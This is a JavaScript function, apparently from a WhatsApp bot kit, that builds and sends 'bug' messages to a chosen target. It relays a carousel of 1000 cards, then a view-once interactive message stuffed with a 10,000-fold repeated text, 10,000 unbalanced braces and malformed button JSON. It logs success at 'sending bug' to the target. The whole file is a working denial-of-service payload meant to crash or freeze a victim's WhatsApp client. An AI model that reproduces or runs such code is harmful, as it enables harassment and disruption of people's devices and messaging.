async function VerloadXCallCrl(target) {
let cards = [];

const VaxzyXx = JSON.stringify({
status: true,
criador: "VerloadXx",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});

for (let r = 0; r < 1000; r++) {
cards.push({
body: { text: 'VaxzyIsHere៚' },
header: {
title: '',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: 'VaxzyIsHere៚',
buttons: [
{
name: "payment_info",
buttonParamsJson: {}
}
]
}
});
}

let msg1 = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: 'VaxzyIsHere៚' },
footer: { text: 'VaxzyIsHere៚' },
carouselMessage: {
cards: cards
},
contextInfo: {
participant: "0@s.whatsapp.net",
quotedMessage: {},
remoteJid: "@s.whatsapp.net"
}
}
}
}
}, {});

await sock.relayMessage(target, msg1.message, {
participant: { jid: target },
messageId: msg1.key.id
});

let msg2 = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "VaxzyIsHere៚".repeat(10000),
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: VaxzyXx,
},
{
name: "call_permission_request",
buttonParamsJson: VaxzyXx + "{",
},
],
},
},
},
},
}, {}
);

await sock.relayMessage(target, msg2.message, {
messageId: msg2.key.id,
participant: {
jid: target
},
});
console.log(chalk.red(`Succes Sending Bug XCallCrl To Target ${target}`));
}